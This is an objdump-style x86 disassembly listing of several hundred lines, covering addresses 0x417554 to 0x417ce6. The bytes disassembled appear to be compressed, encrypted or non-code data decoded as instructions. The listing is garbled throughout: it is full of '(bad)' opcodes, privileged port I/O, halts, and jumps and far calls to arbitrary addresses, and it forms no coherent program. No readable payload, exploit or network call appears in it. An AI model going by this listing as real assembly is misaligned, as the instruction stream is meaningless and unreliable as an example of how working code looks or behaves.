  417554:	xor    esp,DWORD PTR [ecx]
  417556:	add    dh,BYTE PTR [ebp-0x2d5cc9ba]
  41755c:	jno    0x4174e3
  41755e:	lock mov ah,dh
  417561:	nop
  417562:	xor    al,0x46
  417564:	stos   DWORD PTR es:[edi],eax
  417565:	gs xor al,0x41
  417568:	sbb    esi,ebp
  41756a:	and    BYTE PTR ds:[esi-0x35],al
  41756e:	or     eax,0x728c69e1
  417573:	aad    0xe
  417575:	cmp    DWORD PTR [esi+0x3c],eax
  417578:	aad    0x41
  41757a:	mov    dh,bl
  41757c:	sbb    eax,0x63936c21
  417581:	dec    eax
  417582:	add    eax,0x808e97ec
  417587:	enter  0x18d6,0xd6
  41758b:	fsubr  DWORD PTR [ecx]
  41758d:	out    0x43,eax
  41758f:	scas   al,BYTE PTR es:[edi]
  417590:	mov    ch,0x4e
  417592:	mov    ebp,0x5eb93b87
  417597:	jmp    0x9b81b9c8
  41759c:	(bad)
  41759f:	loopne 0x4175d9
  4175a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a2:	mov    WORD PTR [edx-0x52],ss
  4175a5:	popf   
  4175a6:	(bad)  
  4175a7:	push   0x6
  4175a9:	jmp    0x41753f
  4175ab:	sbb    eax,0xf362c34c
  4175b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175b1:	cli    
  4175b2:	(bad)  
  4175b3:	out    dx,al
  4175b4:	pop    ecx
  4175b5:	repnz dec eax
  4175b7:	aam    0x16
  4175b9:	inc    ebp
  4175ba:	adc    dh,dl
  4175bc:	test   DWORD PTR [edi-0x6f9c3e45],ebx
  4175c2:	mul    DWORD PTR [ebp+0x9]
  4175c5:	jo     0x417573
  4175c7:	xor    eax,0xf3270a66
  4175cc:	dec    edi
  4175cd:	jbe    0x41759c
  4175cf:	dec    esi
  4175d0:	push   0x27
  4175d2:	dec    edx
  4175d3:	sbb    BYTE PTR [eax],ah
  4175d5:	adc    ebp,DWORD PTR [esi+0x13]
  4175d8:	fucomi st,st(0)
  4175da:	fstp   QWORD PTR ds:0xf7dd3641
  4175e0:	retf   0x579a
  4175e3:	xlat   BYTE PTR ds:[ebx]
  4175e4:	out    dx,al
  4175e5:	jno    0x417584
  4175e7:	pop    esi
  4175e8:	aad    0x59
  4175ea:	les    eax,FWORD PTR [eax]
  4175ec:	fild   WORD PTR [esi+edx*2]
  4175ef:	test   ebp,0xe2f8b8
  4175f5:	inc    ecx
  4175f6:	or     eax,eax
  4175f8:	icebp  
  4175f9:	add    BYTE PTR [ebx],ch
  4175fb:	cli    
  4175fc:	jg     0x4175cd
  4175fe:	into   
  4175ff:	mov    eax,ds:0xf7a9fe46
  417604:	(bad)  
  417605:	mov    ecx,0xf53d63be
  41760a:	fidivr DWORD PTR [ecx-0x1fd81526]
  417610:	xchg   edx,eax
  417611:	mov    ebp,0xdf1c472f
  417616:	add    ah,BYTE PTR [ecx+eiz*1+0x4a]
  41761a:	jge    0x4175b4
  41761c:	addr16 icebp 
  41761e:	inc    ebx
  41761f:	aam    0x23
  417621:	test   bh,ch
  417623:	(bad)  
  417624:	dec    ebx
  417625:	jmp    0x4175d5
  417627:	retf   
  417628:	loopne 0x417619
  41762a:	mov    ch,0xe8
  41762c:	push   ebp
  41762d:	push   es
  41762e:	add    eax,0x8ee61029
  417633:	outs   dx,DWORD PTR ds:[esi]
  417634:	je     0x417654
  417636:	pop    ss
  417637:	dec    esp
  417638:	mov    ecx,0xb19837e
  41763d:	arpl   WORD PTR [eax],di
  41763f:	xchg   edi,eax
  417640:	inc    ecx
  417641:	dec    ebp
  417642:	pop    ds
  417643:	xchg   edx,eax
  417644:	out    dx,al
  417645:	aad    0x9e
  417647:	jp     0x41767f
  417649:	sbb    dh,dl
  41764b:	cmp    edx,DWORD PTR [ebx-0x6f347652]
  417651:	outs   dx,DWORD PTR ds:[esi]
  417652:	mov    ebx,edx
  417654:	out    0x2,al
  417656:	stc    
  417657:	adc    eax,0x1614dbb2
  41765c:	(bad)  
  41765d:	pop    ss
  41765e:	mov    edi,0x1f050a96
  417663:	repnz inc eax
  417665:	xor    eax,DWORD PTR [edx-0x42]
  417668:	sbb    eax,0x55d45c55
  41766d:	mov    bl,BYTE PTR [edi-0x3a9c1bd4]
  417673:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417674:	mov    ?,WORD PTR [edx-0x44]
  417677:	mov    esi,0xeecc8653
  41767c:	mov    ebx,0xf4809cf2
  417681:	retf   0x5105
  417684:	mov    eax,ds:0xb0e397f4
  417689:	mov    WORD PTR [edx-0x732c3853],es
  41768f:	xchg   ebp,eax
  417690:	push   edi
  417691:	fst    DWORD PTR [esi+0x381d3272]
  417697:	push   ss
  417698:	mov    al,ds:0x3eb99065
  41769d:	jne    0x41768b
  41769f:	xor    al,0x62
  4176a1:	lods   al,BYTE PTR ds:[esi]
  4176a2:	jbe    0x417665
  4176a4:	and    al,0x91
  4176a6:	xor    DWORD PTR [edi],esi
  4176a8:	sub    DWORD PTR [eax+0x1e4aa1e2],ebx
  4176ae:	mov    edx,0x2aefd0f
  4176b3:	or     al,0x69
  4176b5:	dec    ebx
  4176b6:	icebp  
  4176b7:	xchg   esi,eax
  4176b8:	dec    BYTE PTR [esi+eiz*2+0x35]
  4176bc:	cwde   
  4176bd:	out    dx,al
  4176be:	jae    0x4176b9
  4176c0:	pushf  
  4176c1:	out    0x5d,al
  4176c3:	inc    esi
  4176c4:	test   al,0xd3
  4176c6:	fsubr  st(4),st
  4176c8:	cwde   
  4176c9:	xchg   DWORD PTR [edi],eax
  4176cb:	and    BYTE PTR [ebp+0x6e4be26e],cl
  4176d1:	fwait
  4176d2:	pusha  
  4176d3:	push   ecx
  4176d4:	clc    
  4176d5:	lods   eax,DWORD PTR es:[esi]
  4176d7:	jae    0x417661
  4176d9:	push   edi
  4176da:	push   cs
  4176db:	add    BYTE PTR [ebp-0x37],al
  4176de:	lock in al,dx
  4176e0:	out    dx,eax
  4176e1:	lods   eax,DWORD PTR ds:[esi]
  4176e2:	jae    0x4176a7
  4176e4:	ret    
  4176e5:	mov    dh,0x8e
  4176e7:	sbb    al,0x6d
  4176e9:	inc    eax
  4176ea:	in     al,dx
  4176eb:	mov    ebp,0x83abe3dd
  4176f0:	cwde   
  4176f1:	stos   DWORD PTR es:[edi],eax
  4176f2:	sbb    bh,BYTE PTR [eax]
  4176f4:	sti    
  4176f5:	sti    
  4176f6:	xchg   DWORD PTR [ebx+0x62830828],eax
  4176fc:	in     al,0xf4
  4176fe:	fisttp DWORD PTR [edx]
  417700:	jne    0x41775b
  417702:	xor    bl,dl
  417704:	sbb    esi,ebp
  417706:	mov    ch,0xd9
  417708:	call   0xa69ced04
  41770d:	xor    eax,0x589b85b2
  417712:	or     dl,ch
  417714:	leave  
  417715:	inc    ebp
  417716:	push   ecx
  417717:	cmp    ch,BYTE PTR [esp+ebp*4-0x62]
  41771b:	xlat   BYTE PTR ds:[ebx]
  41771c:	loopne 0x417702
  41771e:	xchg   edi,eax
  41771f:	mov    ah,0x3
  417721:	xchg   edi,eax
  417722:	xor    BYTE PTR [edi+0x37],bh
  417725:	jb     0x4177a3
  417727:	push   edx
  417728:	dec    ecx
  417729:	cdq    
  41772a:	xor    esp,0x82d1792d
  417730:	ja     0x417712
  417732:	fisttp WORD PTR [ebp-0x7eab4d1a]
  417738:	out    dx,al
  417739:	popf   
  41773a:	aam    0x84
  41773c:	jl     0x41775c
  41773e:	pop    ds
  41773f:	sub    edi,0x4b
  417742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417743:	clc    
  417744:	mov    ebp,0xf5e0fd35
  417749:	jecxz  0x4176eb
  41774b:	and    DWORD PTR [esi-0xc11d26],ebp
  417751:	ins    DWORD PTR es:[edi],dx
  417752:	dec    ebx
  417753:	jg     0x417773
  417755:	mov    esp,0xb36a858f
  41775a:	push   ds
  41775b:	hlt    
  41775c:	and    dh,al
  41775e:	mov    al,0xe1
  417760:	inc    edx
  417761:	addr16 sbb ecx,edi
  417764:	fdiv   DWORD PTR [ebp-0x39]
  417767:	out    0xed,eax
  417769:	out    0xcd,al
  41776b:	adc    eax,DWORD PTR [esp+eiz*4]
  41776e:	pop    esi
  41776f:	lods   al,BYTE PTR ds:[esi]
  417770:	push   edi
  417771:	mov    ecx,0x6047d055
  417776:	icebp  
  417777:	ja     0x4177b9
  417779:	outs   dx,DWORD PTR ds:[esi]
  41777a:	adc    eax,0xcfa153df
  41777f:	xor    eax,0x12f9f43b
  417784:	sahf   
  417785:	leave  
  417786:	test   al,0x85
  417788:	(bad)  
  417789:	cdq    
  41778a:	ins    DWORD PTR es:[edi],dx
  41778b:	dec    esi
  41778c:	lds    edi,FWORD PTR [edi+0x58]
  41778f:	xor    al,0xa9
  417791:	adc    esp,edi
  417793:	es xor al,0x95
  417796:	fiadd  DWORD PTR [eax]
  417798:	add    esi,esi
  41779a:	test   al,0xad
  41779c:	jne    0x41772f
  41779e:	jo     0x4177c0
  4177a0:	add    ebp,DWORD PTR [ebp+0x15]
  4177a3:	sub    BYTE PTR [ebx+0x674345f8],bh
  4177a9:	scas   eax,DWORD PTR es:[edi]
  4177aa:	dec    ebp
  4177ab:	fnsave [eax-0x49]
  4177ae:	ins    BYTE PTR es:[edi],dx
  4177af:	rcr    cl,0xf8
  4177b2:	lahf   
  4177b3:	pop    ebx
  4177b4:	cmp    ch,BYTE PTR [ecx]
  4177b6:	cmps   BYTE PTR es:[si],BYTE PTR es:[di]
  4177b9:	cmp    DWORD PTR [eax-0x18],eax
  4177bc:	leave  
  4177bd:	mov    al,0xf6
  4177bf:	cwde   
  4177c0:	xchg   BYTE PTR [edi-0x1112a92],ah
  4177c6:	ficom  DWORD PTR [ebx+0x62895b0c]
  4177cc:	cmp    BYTE PTR [esi],bl
  4177ce:	mov    ah,0xc4
  4177d0:	(bad)  [esp+ebx*8]
  4177d3:	addr16 sti 
  4177d5:	scas   al,BYTE PTR es:[edi]
  4177d6:	in     eax,0x8f
  4177d8:	(bad)  
  4177d9:	sbb    DWORD PTR [esi-0xb],edi
  4177dc:	adc    al,0x22
  4177de:	test   DWORD PTR [edi+ebx*4-0x54],esi
  4177e2:	xor    al,BYTE PTR [esi-0x5841bf4d]
  4177e8:	xchg   edx,eax
  4177e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ea:	cmp    eax,0x218c4aac
  4177ef:	sbb    ch,BYTE PTR [edx-0x6d]
  4177f2:	ja     0x4177cc
  4177f4:	cmp    esp,DWORD PTR [eax]
  4177f6:	shl    DWORD PTR [ecx-0x43],cl
  4177f9:	cmp    edx,DWORD PTR [edi]
  4177fb:	push   edi
  4177fc:	sbb    DWORD PTR [ebx-0x3a],ebp
  4177ff:	sub    al,0x5
  417801:	or     al,0x8
  417803:	into   
  417804:	mov    ebp,0x8a22b5a
  417809:	iret   
  41780a:	mov    esp,0xdbe0cbe0
  41780f:	nop
  417810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417811:	arpl   bx,si
  417813:	inc    esi
  417814:	repnz ds scas al,BYTE PTR es:[edi]
  417817:	(bad)  
  417818:	aas    
  417819:	mov    esi,0x22a4a10f
  41781e:	cdq    
  41781f:	cs mov dl,0x72
  417822:	sti    
  417823:	mov    al,0x97
  417825:	xor    eax,0xe15f973f
  41782a:	adc    bh,BYTE PTR cs:[edx]
  41782d:	sub    al,0x5b
  41782f:	mov    WORD PTR [eax],fs
  417831:	cmp    DWORD PTR [eax-0x35],esi
  417834:	xor    DWORD PTR [eax-0x3e64ba84],esp
  41783a:	repnz popf 
  41783c:	rol    BYTE PTR [edx*1+0x46af7dff],0x36
  417844:	add    al,0xd5
  417846:	xchg   edx,eax
  417847:	ds sti 
  417849:	scas   eax,DWORD PTR es:[edi]
  41784a:	jle    0x417872
  41784c:	data16 lods al,BYTE PTR ds:[esi]
  41784e:	sbb    eax,0x8cc74d4e
  417853:	aad    0x7e
  417855:	shr    DWORD PTR [edx-0x347c73cc],0x9e
  41785c:	sbb    eax,DWORD PTR [edx]
  41785e:	shl    DWORD PTR [ebx-0x2e0c1ca0],0xdb
  417865:	add    dl,BYTE PTR [ebx]
  417867:	inc    edi
  417868:	mov    edi,DWORD PTR [ecx-0x54]
  41786b:	adc    ebp,esp
  41786d:	inc    eax
  41786e:	mov    al,0xb1
  417870:	dec    edi
  417871:	scas   al,BYTE PTR es:[edi]
  417872:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417873:	mov    al,al
  417875:	shl    DWORD PTR [ebx-0x72cca2dc],cl
  41787b:	push   edi
  41787c:	inc    ebp
  41787d:	out    0x8d,eax
  41787f:	mov    gs,eax
  417881:	mov    cl,BYTE PTR [esi]
  417883:	or     eax,0xf6f19693
  417888:	sub    eax,0x44ea1a4b
  41788d:	fild   WORD PTR [eax-0x59]
  417890:	mov    bh,0xeb
  417892:	mov    ebx,0xfa99dc27
  417897:	sub    cl,BYTE PTR [ecx+0x6]
  41789a:	mov    ds:0xd324dd41,al
  41789f:	cmc    
  4178a0:	fdiv   QWORD PTR [edi]
  4178a2:	xlat   BYTE PTR ds:[ebx]
  4178a3:	aas    
  4178a4:	sbb    eax,0x819e3b39
  4178a9:	sub    eax,0xfede3a25
  4178ae:	outs   dx,DWORD PTR ds:[esi]
  4178af:	jae    0x417852
  4178b1:	arpl   WORD PTR [edx],ax
  4178b3:	imul   eax,ecx,0x723c2a1
  4178b9:	daa    
  4178ba:	pop    eax
  4178bb:	cli    
  4178bc:	hlt    
  4178bd:	pop    ecx
  4178be:	add    dh,0x76
  4178c1:	mov    esi,0xdef31ac6
  4178c6:	mov    esi,0x4f21f790
  4178cb:	rol    BYTE PTR [edx+0x38a71d32],cl
  4178d1:	cmp    DWORD PTR [ebp-0x8079904],0x2b26d50b
  4178db:	ss pushfw 
  4178de:	imul   esp,DWORD PTR [eax+ebx*8],0xffffffb4
  4178e2:	cmp    BYTE PTR [esi-0x7d],0xe9
  4178e6:	pop    ss
  4178e7:	adc    ebx,DWORD PTR [edi+0x1bf81d68]
  4178ed:	jp     0x41793d
  4178ef:	cmp    ah,BYTE PTR [edx+0x3bdb1e1f]
  4178f5:	pop    edx
  4178f6:	outs   dx,DWORD PTR ds:[esi]
  4178f7:	sub    edx,ebx
  4178f9:	mov    BYTE PTR ds:0x10673844,al
  4178ff:	pop    ebx
  417900:	sti    
  417901:	cli    
  417902:	aas    
  417903:	ret    0x5a60
  417906:	pop    ebx
  417907:	and    ah,dl
  417909:	mov    ebx,0x1ed933a4
  41790e:	jl     0x41797c
  417910:	fmul   DWORD PTR [edx+0x6d]
  417913:	add    BYTE PTR [ebp+0x2e],ch
  417916:	popa   
  417917:	add    eax,DWORD PTR es:[eax+0x3f]
  41791b:	pop    esi
  41791c:	pop    edi
  41791d:	fldcw  WORD PTR [eax-0x3c617588]
  417923:	jge    0x4178f6
  417925:	jno    0x4178b3
  417927:	cli    
  417928:	cli    
  417929:	out    0xe4,al
  41792b:	ret    
  41792c:	xchg   bh,bl
  41792e:	dec    ebp
  41792f:	xchg   ecx,eax
  417930:	cs push ds
  417932:	add    DWORD PTR [edi+0x3b00cd7f],ebp
  417938:	xchg   ebx,eax
  417939:	(bad)  
  41793b:	and    BYTE PTR [ecx],al
  41793d:	popf   
  41793e:	mov    dl,0x6b
  417940:	es in  al,dx
  417942:	div    BYTE PTR [edi-0x6b633264]
  417948:	retf   
  417949:	mov    eax,0x2afc5679
  41794e:	cmp    al,0x32
  417950:	mov    al,0xa6
  417952:	in     al,0xd9
  417954:	pop    ecx
  417955:	aas    
  417956:	rol    DWORD PTR [ecx+0x42],1
  417959:	add    edi,ebp
  41795b:	rep stos DWORD PTR es:[edi],eax
  41795d:	sub    bh,cl
  41795f:	and    al,0xf8
  417961:	lea    ebp,[edi]
  417963:	xchg   ecx,eax
  417964:	fs or  eax,0x2286d888
  41796a:	mov    bh,0x1b
  41796c:	jmp    0x41793e
  41796e:	paddsb mm5,mm6
  417971:	aad    0x48
  417973:	sbb    ch,BYTE PTR [edx+0x3956f744]
  417979:	mov    dl,0x79
  41797b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797c:	test   BYTE PTR [ebp+0x7a],bh
  41797f:	cli    
  417980:	xchg   DWORD PTR [edi],edx
  417982:	jbe    0x417928
  417984:	inc    esp
  417985:	(bad)  
  417986:	addr16 mov bl,0xd6
  417989:	adc    bl,BYTE PTR [ecx]
  41798b:	and    al,0x33
  41798d:	aaa    
  41798e:	imul   eax,DWORD PTR [ecx+ebp*4-0x7e5bce4f],0x9fd3cad6
  417999:	pop    ds
  41799a:	jno    0x41791e
  41799c:	pop    edx
  41799d:	mov    esi,0x67d38a45
  4179a2:	call   0x5d34:0xddd4651
  4179a9:	push   ds
  4179aa:	clc    
  4179ab:	data16 std 
  4179ad:	cmp    al,0x2b
  4179af:	daa    
  4179b0:	push   cs
  4179b1:	ds cmc 
  4179b3:	jmp    0x7b47:0x7b01d8c6
  4179ba:	in     al,dx
  4179bb:	enter  0xec85,0xc2
  4179bf:	jmp    0x417998
  4179c1:	leave  
  4179c2:	pop    ebx
  4179c3:	inc    esp
  4179c4:	scas   eax,DWORD PTR es:[edi]
  4179c5:	cmp    al,0x29
  4179c7:	add    ecx,DWORD PTR [esi+0x6e]
  4179ca:	xchg   ecx,eax
  4179cb:	test   eax,0x7626fe0b
  4179d0:	pop    edi
  4179d1:	pop    ecx
  4179d2:	fild   DWORD PTR [esi]
  4179d4:	pusha  
  4179d5:	fwait
  4179d6:	scas   al,BYTE PTR es:[edi]
  4179d7:	ins    DWORD PTR es:[edi],dx
  4179d8:	xchg   ebp,eax
  4179d9:	hlt    
  4179da:	push   ebx
  4179db:	lahf   
  4179dc:	popf   
  4179dd:	jecxz  0x41798d
  4179df:	sub    eax,0x4ecbb84c
  4179e4:	sbb    cl,BYTE PTR [esp+eax*2+0x151853a6]
  4179eb:	push   edi
  4179ec:	ins    DWORD PTR es:[edi],dx
  4179ed:	xchg   cl,dl
  4179ef:	sar    dh,1
  4179f1:	lods   eax,DWORD PTR ds:[esi]
  4179f2:	xor    eax,0x19bd4c2d
  4179f7:	and    BYTE PTR [esp+ecx*2-0x66],cl
  4179fb:	push   esp
  4179fc:	icebp  
  4179fd:	dec    esi
  4179fe:	add    al,0x40
  417a00:	test   edx,edi
  417a02:	mov    DWORD PTR [edi],edi
  417a04:	mov    BYTE PTR [eax],dh
  417a06:	push   ss
  417a07:	jb     0x417a2f
  417a09:	push   cs
  417a0a:	dec    edi
  417a0b:	adc    ebp,DWORD PTR [esi]
  417a0d:	dec    ebp
  417a0e:	test   BYTE PTR [ecx],dl
  417a10:	dec    esi
  417a11:	int    0xcb
  417a13:	push   0xdbad1e05
  417a18:	push   ebp
  417a19:	mov    ah,0x76
  417a1b:	lods   al,BYTE PTR ds:[esi]
  417a1c:	xor    al,0x14
  417a1e:	mov    bl,0xdc
  417a20:	pop    ebx
  417a21:	push   ecx
  417a22:	outs   dx,BYTE PTR ds:[esi]
  417a23:	pop    ss
  417a24:	jmp    0x417a43
  417a26:	out    dx,eax
  417a27:	xchg   ecx,eax
  417a28:	pop    ss
  417a29:	jns    0x417a1e
  417a2b:	gs pop edi
  417a2d:	inc    ebp
  417a2e:	push   esp
  417a2f:	mov    ?,WORD PTR [esi]
  417a31:	pop    edx
  417a32:	cmp    dh,cl
  417a34:	mov    ds:0x92d4bbce,eax
  417a39:	jb     0x417a5b
  417a3b:	neg    BYTE PTR [ebx]
  417a3d:	sbb    BYTE PTR [eax],dl
  417a3f:	or     DWORD PTR [eax],eax
  417a41:	pop    ds
  417a42:	dec    DWORD PTR [eax-0x66d5bdd]
  417a48:	ds push 0xffffffef
  417a4b:	sub    BYTE PTR [edx+0x1c99ef2e],dh
  417a51:	mov    bl,0x1b
  417a53:	fdivr  st(0),st
  417a55:	data16 in al,0xa5
  417a58:	loopne 0x417aca
  417a5a:	out    0x9a,eax
  417a5c:	and    ecx,eax
  417a5e:	inc    eax
  417a5f:	fild   WORD PTR [ebp-0x6ce85b2]
  417a65:	js     0x417a3e
  417a67:	std    
  417a68:	call   0xb89a4e4
  417a6d:	icebp  
  417a6e:	cmp    al,0xe4
  417a70:	jl     0x417a23
  417a72:	mov    eax,0x1d15e31a
  417a77:	ins    BYTE PTR es:[edi],dx
  417a78:	es aam 0x3b
  417a7b:	test   BYTE PTR [edx-0x25a88c7d],ch
  417a81:	test   DWORD PTR [edx],edx
  417a83:	sub    ah,BYTE PTR [eax]
  417a85:	add    eax,0x6d5da01d
  417a8a:	lods   eax,DWORD PTR ds:[esi]
  417a8b:	fidiv  WORD PTR [edx-0x6d]
  417a8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a8f:	mov    al,ds:0xeabf197a
  417a94:	sbb    al,0x4a
  417a96:	cld    
  417a97:	dec    edx
  417a98:	in     al,0xf1
  417a9a:	sti    
  417a9b:	cwde   
  417a9c:	inc    ecx
  417a9d:	outs   dx,DWORD PTR ds:[esi]
  417a9e:	or     ebp,ebx
  417aa0:	push   esp
  417aa1:	sbb    al,0xb2
  417aa3:	(bad)  
  417aa4:	adc    ecx,DWORD PTR [edx]
  417aa6:	je     0x417a43
  417aa8:	push   edi
  417aa9:	sub    dl,ah
  417aab:	icebp  
  417aac:	adc    ah,BYTE PTR [edi-0x33ac94e2]
  417ab2:	add    eax,0x36742d59
  417ab7:	dec    edi
  417ab8:	or     ebp,esi
  417aba:	hlt    
  417abb:	jo     0x417a7b
  417abd:	std    
  417abe:	inc    edx
  417abf:	xchg   edx,eax
  417ac0:	int    0x27
  417ac2:	lahf   
  417ac3:	pop    edx
  417ac4:	or     al,0xb
  417ac6:	(bad)  
  417ac7:	xor    al,0x9d
  417ac9:	mov    esp,0x9c929bf8
  417ace:	ds out 0xab,eax
  417ad1:	lods   al,BYTE PTR ds:[esi]
  417ad2:	jmp    0xbf6ec818
  417ad7:	mov    dl,0x63
  417ad9:	add    DWORD PTR [edx-0x5e],esi
  417adc:	pop    edx
  417add:	data16 fild WORD PTR [esp+esi*8+0x7d503f5b]
  417ae5:	pop    edx
  417ae6:	jno    0x417acb
  417ae8:	fisub  DWORD PTR [edi-0x38]
  417aeb:	jl     0x417abc
  417aed:	xchg   ebp,eax
  417aee:	aaa    
  417aef:	pushf  
  417af0:	ins    BYTE PTR es:[edi],dx
  417af1:	or     eax,0xf6ba674a
  417af6:	shr    DWORD PTR [edi+0x4c],cl
  417af9:	adc    BYTE PTR [ecx+0x6d9f7a62],bl
  417aff:	daa    
  417b00:	mov    WORD PTR [eax],cs
  417b02:	cs push edx
  417b04:	xchg   ebp,eax
  417b05:	(bad)  
  417b06:	lea    edx,[ecx-0x42]
  417b09:	or     eax,0x88d95f95
  417b0e:	ret    
  417b0f:	das    
  417b10:	shl    BYTE PTR [eax],cl
  417b12:	mov    dl,0x48
  417b14:	jge    0x417b8c
  417b16:	mov    eax,0xd9fe7e6b
  417b1b:	or     al,0x28
  417b1d:	sbb    BYTE PTR [ebx+0x156222b1],al
  417b23:	jo     0x417ad3
  417b25:	pushf  
  417b26:	push   esp
  417b27:	mov    cl,0x8
  417b29:	nop
  417b2a:	(bad)  
  417b2b:	imul   BYTE PTR [edx]
  417b2d:	cmp    ecx,ebp
  417b2f:	mov    ebx,DWORD PTR [eax+eiz*2-0x1103279b]
  417b36:	jmp    0x9d70:0xb0b4194b
  417b3d:	jb     0x417b0b
  417b3f:	push   edx
  417b40:	icebp  
  417b41:	adc    dl,cl
  417b43:	dec    esi
  417b44:	dec    edi
  417b45:	daa    
  417b46:	fidiv  DWORD PTR [ebp-0x24e8c939]
  417b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b4d:	test   al,0xda
  417b4f:	push   edi
  417b50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b51:	loopne 0x417b3f
  417b53:	push   eax
  417b54:	or     bl,BYTE PTR [ebp+0x5e621c6b]
  417b5a:	inc    esi
  417b5b:	xlat   BYTE PTR ds:[ebx]
  417b5c:	leave  
  417b5d:	jle    0x417afc
  417b5f:	xchg   ecx,eax
  417b60:	mov    bh,0x93
  417b62:	retf   0x4146
  417b65:	(bad)  
  417b66:	push   ss
  417b67:	repz xchg esi,eax
  417b69:	popa   
  417b6a:	mov    ah,0x63
  417b6c:	adc    BYTE PTR [esp+ecx*4-0x11c85f8d],ah
  417b73:	adc    BYTE PTR [esi-0x6b],ch
  417b76:	ror    BYTE PTR [esi+ebx*8+0x1dc09d67],0x5f
  417b7e:	inc    esp
  417b7f:	push   esi
  417b80:	loopne 0x417c01
  417b82:	stc    
  417b83:	call   0x5ead850f
  417b88:	xchg   ecx,eax
  417b89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b8a:	into   
  417b8b:	mov    bl,ch
  417b8d:	or     BYTE PTR [ecx-0x31],0x36
  417b91:	mov    ecx,0xfde9ae02
  417b96:	push   ebx
  417b97:	mov    eax,0x29b3e068
  417b9c:	retf   
  417b9d:	and    BYTE PTR [eax-0x7afee9c8],bl
  417ba3:	xchg   DWORD PTR [edx-0x1e],ebp
  417ba6:	js     0x417b34
  417ba8:	ret    0x6a6b
  417bab:	mov    dl,0xc2
  417bad:	or     BYTE PTR [edx-0x4c],dl
  417bb0:	iret   
  417bb1:	popf   
  417bb2:	mov    esi,0x91bb96f1
  417bb7:	mov    al,ds:0x66d51246
  417bbc:	ret    
  417bbd:	or     eax,0x2e44d02a
  417bc2:	popa   
  417bc3:	push   edx
  417bc4:	xchg   esi,eax
  417bc5:	xor    DWORD PTR [ecx+0x2c26dbd],esi
  417bcb:	jmp    0xf2eb111
  417bd0:	add    al,dh
  417bd2:	jge    0x417baa
  417bd4:	jno    0x417be0
  417bd6:	nop
  417bd7:	loopne 0x417c12
  417bd9:	jmp    0x417bca
  417bdb:	je     0x417b80
  417bdd:	(bad)  
  417bdf:	xor    eax,0xfdbbde91
  417be4:	push   edi
  417be5:	lods   eax,DWORD PTR ds:[esi]
  417be6:	(bad)  
  417be7:	cld    
  417be8:	xchg   ecx,eax
  417be9:	jmp    0xa4e9108e
  417bee:	xchg   edx,eax
  417bef:	ins    DWORD PTR es:[edi],dx
  417bf0:	shl    BYTE PTR [esi],cl
  417bf2:	popa   
  417bf3:	(bad)
  417bf8:	and    ecx,DWORD PTR [edi-0x567dae36]
  417bfe:	les    eax,FWORD PTR [edi-0x1c78d186]
  417c04:	(bad)  
  417c06:	pshufw mm1,mm5,0x4e
  417c0a:	pusha  
  417c0b:	daa    
  417c0c:	push   ds
  417c0d:	mov    edx,0x2e537655
  417c12:	mov    DWORD PTR [ebp-0x27a5290d],ecx
  417c18:	(bad)  
  417c19:	(bad)  
  417c1a:	push   esi
  417c1b:	jne    0x417c9c
  417c1d:	jnp    0x417bae
  417c1f:	es sub ch,ah
  417c22:	cmp    dl,bl
  417c24:	sub    al,0xed
  417c26:	cmc    
  417c27:	in     eax,dx
  417c28:	in     eax,dx
  417c29:	dec    ecx
  417c2a:	cmp    al,0x61
  417c2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c2d:	mov    eax,0xb05991fa
  417c32:	test   eax,0xf12bd8e2
  417c37:	mov    eax,0xeb9917a5
  417c3c:	add    bl,dl
  417c3e:	or     BYTE PTR [ebp+0x1a],al
  417c41:	push   DWORD PTR [edx]
  417c43:	mov    WORD PTR [edi-0x741d1308],gs
  417c49:	cli    
  417c4a:	arpl   WORD PTR [edx-0x76],di
  417c4d:	jge    0x417bdf
  417c4f:	pop    esp
  417c50:	mov    esp,0x3dcd5585
  417c55:	and    eax,0x78021625
  417c5a:	sub    edx,ebp
  417c5c:	mov    dh,0x49
  417c5e:	jns    0x417c49
  417c60:	push   es
  417c61:	or     BYTE PTR [esi+eiz*1-0x51],bl
  417c65:	and    bl,bl
  417c67:	adc    eax,0xda6748f9
  417c6c:	sbb    DWORD PTR [edi-0x13],eax
  417c6f:	dec    ecx
  417c70:	adc    BYTE PTR [edi-0x74],bl
  417c73:	loope  0x417cc6
  417c75:	inc    esi
  417c76:	in     al,dx
  417c77:	push   edx
  417c78:	shl    bl,0x53
  417c7b:	pop    edx
  417c7c:	and    DWORD PTR [eax+0x320b546f],0x92e00848
  417c86:	enter  0xa0f6,0x38
  417c8a:	idiv   BYTE PTR [eax+ebx*4+0xdd197a3]
  417c91:	into   
  417c92:	cs and bl,al
  417c95:	sahf   
  417c96:	dec    esp
  417c97:	rcl    BYTE PTR [edi-0x78],0x26
  417c9b:	call   0xdd46:0x131f03a3
  417ca2:	lahf   
  417ca3:	int    0x2e
  417ca5:	mov    bh,0xa9
  417ca7:	cdq    
  417ca8:	dec    ebp
  417ca9:	mov    eax,ds:0x3b1eb2e5
  417cae:	imul   ebx,DWORD PTR [esi+0x21],0x4c
  417cb2:	packsswb mm3,QWORD PTR [eax+0x662664ea]
  417cb9:	push   esi
  417cba:	jbe    0x417ce7
  417cbc:	fwait
  417cbd:	cmc    
  417cbe:	ret    0x472a
  417cc1:	clc    
  417cc2:	addr16 cwde 
  417cc4:	xor    DWORD PTR [eax+esi*2],0x1d
  417cc8:	lahf   
  417cc9:	mov    ecx,0x7025f618
  417cce:	inc    edi
  417ccf:	or     al,0xef
  417cd1:	movhps xmm4,QWORD PTR [esi]
  417cd4:	pop    es
  417cd5:	ins    BYTE PTR es:[edi],dx
  417cd6:	shl    ah,cl
  417cd8:	cmc    
  417cd9:	adc    BYTE PTR ds:0x496e5f75,dl
  417cdf:	xchg   ebx,ecx
  417ce1:	xchg   ecx,eax
  417ce2:	lods   al,BYTE PTR ds:[esi]
  417ce3:	(bad)  
  417ce6:	popf   
